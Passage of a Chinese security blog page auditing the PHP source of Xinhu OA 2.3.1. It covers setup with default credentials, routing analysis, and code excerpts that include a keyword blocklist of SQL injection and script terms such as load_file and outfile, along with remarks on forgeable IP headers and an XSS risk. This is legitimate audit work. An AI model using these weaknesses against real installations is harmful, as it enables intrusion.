@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>信呼OA2.3.1版本代码审计 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, php安全' />
+  <meta itemprop="name" content="信呼OA2.3.1版本代码审计">
+  <meta itemprop="datePublished" content="2024-09-18T18:22:01+08:00">
+  <meta itemprop="dateModified" content="2024-09-18T18:22:01+08:00">
+  <meta itemprop="wordCount" content="462">
+  <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="信呼OA2.3.1版本代码审计">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-18T18:22:01+08:00">
+    <meta property="article:modified_time" content="2024-09-18T18:22:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Php安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="信呼OA2.3.1版本代码审计">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "信呼OA2.3.1版本代码审计",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/%E5%AE%A1%E8%AE%A1\/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  462 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/%E5%AE%A1%E8%AE%A1\/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/","datePublished": "2024-09-18T18:22:01+08:00","dateModified": "2024-09-18T18:22:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">信呼OA2.3.1版本代码审计</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>信呼OA2.3.1版本代码审计</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-09-18 18:22:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-09-18">2024-09-18</time></span>&nbsp;<span title="462 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#路由分析">路由分析</a></li>
+    <li><a href="#代码审计">代码审计</a>
+      <ul>
+        <li><a href="#任意密码修改">任意密码修改</a></li>
+        <li><a href="#sql盲注">SQL盲注</a></li>
+        <li><a href="#文件包含">文件包含</a></li>
+        <li><a href="#未授权备份">未授权备份</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h2 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>下载：https://github.com/rainrocka/xinhu/tree/a25c5db365e346c9c03c5ee6269a80d2afb3a25b</p>
+<p>搭建起来，改一下config的设置就好</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181010659.webp" alt="image-20240918101016437" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181010659.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181010659.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181010659.webp?size=large 2x" data-title="image-20240918101016437" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>1、进入目录webmian下，将webmainConfig.php1 改成 webmainConfig.php，配置一下里面信息，如数据库，地址等。</p>
+<p>2、在webmainConfig.php的参数randkey的填写：agpjwelxhcviusmzqdtbknoyrf，这个一定要写，每次刷新都会变的。</p>
+<p>3、导入数据库，数据库文件在webmain/install/rockxinhu.sql。导入到配置的数据库名称中如：rockxinhu，没有就要建立个数据库。</p>
+<p>4、删除文件：webmain/webmainConfig.php1，删除目录：webmain/install。</p>
+<p>5、这样就基本完成了，用浏览器打开地址如：http://127.0.0.1/，登录初始帐号：admin,密码：123456。</p>
+<p>修改初始密码为xinhu666</p>
+<h2 id="路由分析" class="heading-element"><span>路由分析</span>
+  <a href="#%e8%b7%af%e7%94%b1%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>要审计一个web项目，要做的第一件事就是搞懂这个项目的路由，或者说控制器的访问规则</p>
+<p>从Index.php开始看，它包含了config.php：<code>include_once('config/config.php');</code></p>
+<p>而这个config.php也包含了一些文件，后面会用到</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">include_once</span>(<span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">ROOT_PATH</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;/include/rockFun.php&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">include_once</span>(<span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">ROOT_PATH</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;/include/Chajian.php&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">include_once</span>(<span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">ROOT_PATH</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;/include/class/rockClass.php&#39;</span>);</span></span></code></pre></div><p>它首先实例化了一个对象<code>$rock  = new rockClass();</code></p>
+<p>跟进去看一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>()
+</span></span><span style="display:flex;"><span>	{		
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ip</span>		<span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">getclientip</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">host</span>		<span style="color:#ff636f">=</span> <span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_HOST&#39;</span>])		<span style="color:#ff636f">?</span> <span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_HOST&#39;</span>]		<span style="color:#ff636f">:</span> <span style="color:#a6be9d">&#39;&#39;</span> ;
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">url</span>		<span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">isqywx</span>	<span style="color:#ff636f">=</span> <span style="color:#ff636f">false</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">win</span>		<span style="color:#ff636f">=</span> <span style="color:#58a1dd">php_uname</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">HTTPweb</span>	<span style="color:#ff636f">=</span> <span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_USER_AGENT&#39;</span>])<span style="color:#ff636f">?</span> <span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_USER_AGENT&#39;</span>]	<span style="color:#ff636f">:</span> <span style="color:#a6be9d">&#39;&#39;</span> ;
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">web</span>		<span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">getbrowser</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">unarr</span>	<span style="color:#ff636f">=</span> <span style="color:#58a1dd">explode</span>(<span style="color:#a6be9d">&#39;,&#39;</span>,<span style="color:#a6be9d">&#39;1,2&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">now</span>		<span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">now</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">date</span>		<span style="color:#ff636f">=</span> <span style="color:#58a1dd">date</span>(<span style="color:#a6be9d">&#39;Y-m-d&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">lvlaras</span>  <span style="color:#ff636f">=</span> <span style="color:#58a1dd">explode</span>(<span style="color:#a6be9d">&#39;,&#39;</span>,<span style="color:#a6be9d">&#39;select ,
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">		alter table,delete ,drop ,update ,insert into,load_file,/*,*/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">lvlaraa</span>  <span style="color:#ff636f">=</span> <span style="color:#58a1dd">explode</span>(<span style="color:#a6be9d">&#39;,&#39;</span>,<span style="color:#a6be9d">&#39;select,alter,delete,drop,update,/*,*/,insert,from,time_so_sec,convert,from_unixtime,unix_timestamp,curtime,time_format,union,concat,information_schema,group_concat,length,load_file,outfile,database,system_user,current_user,user(),found_rows,declare,master,exec,(),select*from,select*&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">lvlarab</span>	<span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">foreach</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">lvlaraa</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">$_i</span>)<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">lvlarab</span>[]<span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>	}</span></span></code></pre></div><p>这里就是获取客户端传过来的一些变量，这里它获取ip的方式就是http头，是可以伪造的，他用htmlspecialchars进行xss过滤，但是没设置参数，默认是只转换双引号的，这里存在XSS风险</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">getclientip</span>()
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$ip</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_CLIENT_IP&#39;</span>])){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$ip</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_CLIENT_IP&#39;</span>];
+</span></span><span style="display:flex;"><span>		}<span style="color:#ff636f">else</span> <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_X_FORWARDED_FOR&#39;</span>])){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$ip</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
+</span></span><span style="display:flex;"><span>		}<span style="color:#ff636f">else</span> <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;REMOTE_ADDR&#39;</span>])){
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">$ip</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_SERVER</span>[<span style="color:#a6be9d">&#39;REMOTE_ADDR&#39;</span>];
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$ip</span><span style="color:#ff636f">=</span> <span style="color:#58a1dd">htmlspecialchars</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">xssrepstr</span>(<span style="color:#58a1dd">$ip</span>));
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$ip</span>){<span style="color:#58a1dd">$ipar</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">explode</span>(<span style="color:#a6be9d">&#39;.&#39;</span>, <span style="color:#58a1dd">$ip</span>);<span style="color:#ff636f">foreach</span>(<span style="color:#58a1dd">$ipar</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">$ip1</span>)<span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">is_numeric</span>(<span style="color:#58a1dd">$ip1</span>))<span style="color:#58a1dd">$ip</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;&#39;</span>;}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">$ip</span>)<span style="color:#58a1dd">$ip</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;unknow&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">return</span> <span style="color:#58a1dd">$ip</span>;
+</span></span><span style="display:flex;"><span>	}</span></span></code></pre></div><p>看一下这个方法：$rock-&gt;get</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$rock</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;p&#39;</span>, <span style="color:#a6be9d">&#39;webmain&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">$name</span>,<span style="color:#58a1dd">$dev</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;&#39;</span>, <span style="color:#58a1dd">$lx</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$val</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$dev</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#58a1dd">$name</span>]))<span style="color:#58a1dd">$val</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_GET</span>[<span style="color:#58a1dd">$name</span>];
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">isempt</span>(<span style="color:#58a1dd">$val</span>))<span style="color:#58a1dd">$val</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$dev</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">jmuncode</span>(<span style="color:#58a1dd">$val</span>, <span style="color:#58a1dd">$lx</span>, <span style="color:#58a1dd">$name</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">isempt</span>(<span style="color:#58a1dd">$str</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$bool</span><span style="color:#ff636f">=</span><span style="color:#ff636f">false</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">if</span>( (<span style="color:#58a1dd">$str</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">||</span><span style="color:#58a1dd">$str</span><span style="color:#ff636f">==</span><span style="color:#ff636f">NULL</span><span style="color:#ff636f">||</span><span style="color:#ff636f">empty</span>(<span style="color:#58a1dd">$str</span>)) <span style="color:#ff636f">&amp;&amp;</span> (<span style="color:#ff636f">!</span><span style="color:#58a1dd">is_numeric</span>(<span style="color:#58a1dd">$str</span>)) )<span style="color:#58a1dd">$bool</span><span style="color:#ff636f">=</span><span style="color:#ff636f">true</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff636f">return</span> <span style="color:#58a1dd">$bool</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">jmuncode</span>(<span style="color:#58a1dd">$s</span>, <span style="color:#58a1dd">$lx</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">$na</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#58a1dd">$jmbo</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">false</span>;
